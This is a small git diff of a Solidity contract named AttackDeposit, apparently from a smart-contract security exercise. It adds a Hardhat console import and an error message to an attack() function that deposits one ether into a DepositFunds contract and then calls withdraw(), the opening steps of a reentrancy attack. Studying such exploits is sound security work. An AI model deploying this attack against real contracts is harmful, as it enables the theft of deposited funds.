@@ -1,6 +1,7 @@
 //SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.7.0;
 
+import 'hardhat/console.sol';
 import './DepositFunds.sol';
 
 contract AttackDeposit {
@@ -14,7 +15,7 @@ contract AttackDeposit {
         }
     }
     function attack() external payable {
-        require(msg.value >= 10 ** 18);
+        require(msg.value >= 10 ** 18, "Error!");
         depositFunds.deposit{value: 10 ** 18}();
         depositFunds.withdraw();
     }
